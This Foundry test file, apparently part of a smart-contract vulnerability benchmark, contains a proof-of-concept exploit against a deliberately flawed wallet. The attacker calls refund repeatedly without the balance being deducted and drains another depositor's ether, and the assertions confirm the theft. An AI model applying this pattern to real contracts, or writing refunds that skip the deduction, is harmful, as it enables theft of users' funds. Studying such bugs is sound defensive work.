pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/wallet_02_refund_nosub.sol";

contract WalletTest is Test {
    Wallet public wallet;
    address public creator = address(0x1);
    address public attacker = address(0x2);
    address public depositor = address(0x3);

    function setUp() public {
        vm.startPrank(creator);
        wallet = new Wallet();
        vm.deal(creator, 10 ether);
        vm.deal(attacker, 1 ether);
        vm.deal(depositor, 5 ether);
        vm.stopPrank();
    }

    function testRefundExploit() public {
        // Depositor funds the contract
        vm.prank(depositor);
        wallet.deposit{value: 5 ether}();

        // Create attacker reference balance after deposit
        vm.prank(attacker);
        wallet.deposit{value: 1 ether}();
        uint256 attackerStartBalance = attacker.balance;

        // Execute multiple refunds without balance deduction
        for (uint i = 0; i < 3; i++) {
            uint256 contractBalanceBefore = address(wallet).balance;
            uint256 attackerBalanceBefore = attacker.balance;

            vm.prank(attacker);
            wallet.refund();

            // Verify funds moved in transaction
            assertEq(
                attacker.balance, 
                attackerBalanceBefore + 1 ether, 
                "Attacker should receive 1 ether per refund"
            );
            assertEq(
                address(wallet).balance, 
                contractBalanceBefore - 1 ether,
                "Contract should lose 1 ether per refund"
            );
            // Verify balance not deducted
            assertEq(
                wallet.getBalance(attacker),
                1 ether,
                "Attacker balance should remain 1 ether"
            );
        }

        // Final state verification
        assertEq(
            address(wallet).balance, 
            3 ether, 
            "Contract should have exactly 3 ether remaining"
        );
        assertEq(
            attacker.balance, 
            attackerStartBalance + 3 ether,
            "Attacker ends with profit (initial + 3 ether stolen)"
        );
        assertEq(
            wallet.getBalance(attacker),
            1 ether,
            "Attacker contract balance remains exploitable"
        );
        assertEq(
            wallet.getBalance(depositor),
            5 ether,
            "Depositor funds remain recorded"
        );
    }
}
